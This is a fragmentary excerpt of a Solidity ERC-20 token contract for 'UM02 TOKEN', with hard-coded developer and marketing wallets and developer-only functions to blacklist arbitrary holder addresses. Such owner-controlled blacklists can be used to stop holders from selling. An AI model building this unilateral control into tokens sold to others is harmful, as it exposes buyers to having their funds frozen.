...
contract UM01 is Context, IERC20, Ownable {
    ...
    string private constant _name = "UM02 TOKEN";
    string private constant _symbol = "$UM02";
    uint8 private constant _decimals = 9;
    
    address payable private _developmentAddress = payable(0x06497E6b57C249692f51EdE75606444D22904f0c);
    address payable private _marketingAddress = payable(0x70DeD55b94D90f6729239A50aB672a24Cad65Ac7);
    ...
    function manage_blacklist(address[] calldata addresses, bool status) public onlyDev() {
        for (uint256 i; i < addresses.length; ++i) {
            isBlacklisted[addresses[i]] = status;
        }
    }

    function enable_blacklist(bool _status) public onlyDev() {
